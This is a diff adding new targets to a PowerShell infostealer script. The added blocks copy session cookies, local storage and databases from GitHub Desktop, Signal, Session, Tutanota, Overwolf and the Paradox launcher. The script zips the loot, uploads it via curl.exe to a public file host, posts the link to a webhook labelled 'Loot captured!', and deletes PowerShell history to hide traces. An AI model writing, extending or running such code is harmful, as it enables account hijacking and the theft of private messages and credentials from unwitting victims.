@@ -88,6 +88,42 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 ############################################################################################################################################################
 
+New-Item -Path "$env:tmp/$FolderName/Developing" -ItemType Directory
+
+# GitHub Desktop
+if (Test-Path "$env:appdata/GitHub Desktop") {
+	New-Item -Path "$env:tmp/$FolderName/Developing/GithubDesktop" -ItemType Directory
+	Copy-Item "$env:appdata\GitHub Desktop\Cookies" "$env:tmp/$FolderName/Developing/GithubDesktop/Cookies"
+	Copy-Item "$env:appdata\GitHub Desktop\Local State" "$env:tmp/$FolderName/Developing/GithubDesktop/Local State"
+	Copy-Item "$env:appdata\GitHub Desktop\Preferences" "$env:tmp/$FolderName/Developing/GithubDesktop/Preferences"
+	Copy-Item "$env:appdata\GitHub Desktop\Local Storage\leveldb" "$env:tmp/$FolderName/Developing/GithubDesktop/Local Storage/leveldb" -Recurse
+	Copy-Item "$env:appdata\GitHub Desktop\Session Storage" "$env:tmp/$FolderName/Developing/GithubDesktop/Session Storage" -Recurse
+	Copy-Item "$env:appdata\GitHub Desktop\databases" "$env:tmp/$FolderName/Developing/GithubDesktop/databases" -Recurse
+}
+
+Compress-Archive -Path $env:tmp/$FolderName/Developing -DestinationPath "$env:tmp/Developing-$ZIP"
+
+$text = "**Developing**: Loot captured! Here is the URL (It expires in 12 hours): "
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Developing-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
+  'content' = $text
+}
+
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+
+Remove-Item "$env:TEMP\$FolderName\Developing" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\Developing-$ZIP" -r -Force -ErrorAction SilentlyContinue
+
+# Delete powershell history periodically
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+############################################################################################################################################################
+
 New-Item -Path "$env:tmp/$FolderName/Streaming" -ItemType Directory
 
 # OBS
@@ -552,6 +588,39 @@ if (Test-Path "$env:appdata/../Local/Keybase/config.json" -PathType Any) {
 	Copy-Item "$env:appdata/../Local/Keybase/config.json" "$env:tmp/$FolderName/Socials/Keybase/config.json"
 }
 
+# Session
+if (Test-Path "$env:appdata/Session") {
+	New-Item -Path "$env:tmp/$FolderName/Socials/Session" -ItemType Directory
+	Copy-Item "$env:appdata\Session\Cookies" "$env:tmp/$FolderName/Socials/Session/Cookies"
+	Copy-Item "$env:appdata\Session\Local State" "$env:tmp/$FolderName/Socials/Session/Local State"
+	Copy-Item "$env:appdata\Session\Preferences" "$env:tmp/$FolderName/Socials/Session/Preferences"
+	Copy-Item "$env:appdata\Session\Local Storage\leveldb" "$env:tmp/$FolderName/Socials/Session/Local Storage/leveldb" -Recurse
+	Copy-Item "$env:appdata\Session\Session Storage" "$env:tmp/$FolderName/Socials/Session/Session Storage" -Recurse
+	Copy-Item "$env:appdata\Session\databases" "$env:tmp/$FolderName/Socials/Session/databases" -Recurse
+}
+
+# Signal
+if (Test-Path "$env:appdata/Signal") {
+	New-Item -Path "$env:tmp/$FolderName/Socials/Signal" -ItemType Directory
+	Copy-Item "$env:appdata\Signal\Cookies" "$env:tmp/$FolderName/Socials/Signal/Cookies"
+	Copy-Item "$env:appdata\Signal\Local State" "$env:tmp/$FolderName/Socials/Signal/Local State"
+	Copy-Item "$env:appdata\Signal\Preferences" "$env:tmp/$FolderName/Socials/Signal/Preferences"
+	Copy-Item "$env:appdata\Signal\Local Storage\leveldb" "$env:tmp/$FolderName/Socials/Signal/Local Storage/leveldb" -Recurse
+	Copy-Item "$env:appdata\Signal\Session Storage" "$env:tmp/$FolderName/Socials/Signal/Session Storage" -Recurse
+	Copy-Item "$env:appdata\Signal\databases" "$env:tmp/$FolderName/Socials/Signal/databases" -Recurse
+}
+
+# Tutanota
+if (Test-Path "$env:appdata/tutanota-desktop") {
+	New-Item -Path "$env:tmp/$FolderName/Socials/Tutanota" -ItemType Directory
+	Copy-Item "$env:appdata\tutanota-desktop\Cookies" "$env:tmp/$FolderName/Socials/Tutanota/Cookies"
+	Copy-Item "$env:appdata\tutanota-desktop\Local State" "$env:tmp/$FolderName/Socials/Tutanota/Local State"
+	Copy-Item "$env:appdata\tutanota-desktop\Preferences" "$env:tmp/$FolderName/Socials/Tutanota/Preferences"
+	Copy-Item "$env:appdata\tutanota-desktop\Local Storage\leveldb" "$env:tmp/$FolderName/Socials/Tutanota/Local Storage/leveldb" -Recurse
+	Copy-Item "$env:appdata\tutanota-desktop\Session Storage" "$env:tmp/$FolderName/Socials/Tutanota/Session Storage" -Recurse
+	Copy-Item "$env:appdata\tutanota-desktop\databases" "$env:tmp/$FolderName/Socials/Tutanota/databases" -Recurse
+}
+
 Compress-Archive -Path $env:tmp/$FolderName/Socials -DestinationPath "$env:tmp/Socials-$ZIP"
 
 $text = "**Socials**: Loot captured! Here is the URL (It expires in 12 hours): "
@@ -601,6 +670,28 @@ if (Test-Path  "$env:appdata/../Local/Rockstar Games/Launcher" -PathType Any) {
 if (Test-Path "$env:appdata/../Local/Ubisoft Game Launcher" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/Gaming/BattleNet -ItemType Directory
 	Copy-Item "$env:appdata/../Local/Ubisoft Game Launcher" "env:tmp/$FolderName/Gaming/Ubisoft" -Recurse
+}
+
+# Overwolf
+if (Test-Path "$env:appdata\..\Local\Overwolf") {
+	New-Item -Path "$env:tmp/$FolderName/Gaming/Overwolf" -ItemType Directory
+	Copy-Item "$env:appdata\..\Local\Overwolf\Cookies" "$env:tmp/$FolderName/Gaming/Overwolf/Cookies"
+	Copy-Item "$env:appdata\..\Local\Overwolf\Local State" "$env:tmp/$FolderName/Gaming/Overwolf/Local State"
+	Copy-Item "$env:appdata\..\Local\Overwolf\Preferences" "$env:tmp/$FolderName/Gaming/Overwolf/Preferences"
+	Copy-Item "$env:appdata\..\Local\Overwolf\Local Storage\leveldb" "$env:tmp/$FolderName/Gaming/Overwolf/Local Storage/leveldb" -Recurse
+	Copy-Item "$env:appdata\..\Local\Overwolf\Session Storage" "$env:tmp/$FolderName/Gaming/Overwolf/Session Storage" -Recurse
+	Copy-Item "$env:appdata\..\Local\Overwolf\databases" "$env:tmp/$FolderName/Gaming/Overwolf/databases" -Recurse
+}
+
+# Paradox
+if (Test-Path "$env:appdata\..\Local\Paradox Interactive\launcher-v2\chromium-data") {
+	New-Item -Path "$env:tmp/$FolderName/Gaming/Paradox" -ItemType Directory
+	Copy-Item "$env:appdata\..\Local\Paradox Interactive\launcher-v2\chromium-data\Cookies" "$env:tmp/$FolderName/Gaming/Paradox/Cookies"
+	Copy-Item "$env:appdata\..\Local\Paradox Interactive\launcher-v2\chromium-data\Local State" "$env:tmp/$FolderName/Gaming/Paradox/Local State"
+	Copy-Item "$env:appdata\..\Local\Paradox Interactive\launcher-v2\chromium-data\Preferences" "$env:tmp/$FolderName/Gaming/Paradox/Preferences"
+	Copy-Item "$env:appdata\..\Local\Paradox Interactive\launcher-v2\chromium-data\Local Storage\leveldb" "$env:tmp/$FolderName/Gaming/Paradox/Local Storage/leveldb" -Recurse
+	Copy-Item "$env:appdata\..\Local\Paradox Interactive\launcher-v2\chromium-data\Session Storage" "$env:tmp/$FolderName/Gaming/Paradox/Session Storage" -Recurse
+	Copy-Item "$env:appdata\..\Local\Paradox Interactive\launcher-v2\chromium-data\databases" "$env:tmp/$FolderName/Gaming/Paradox/databases" -Recurse
 }
 
 # Roblox
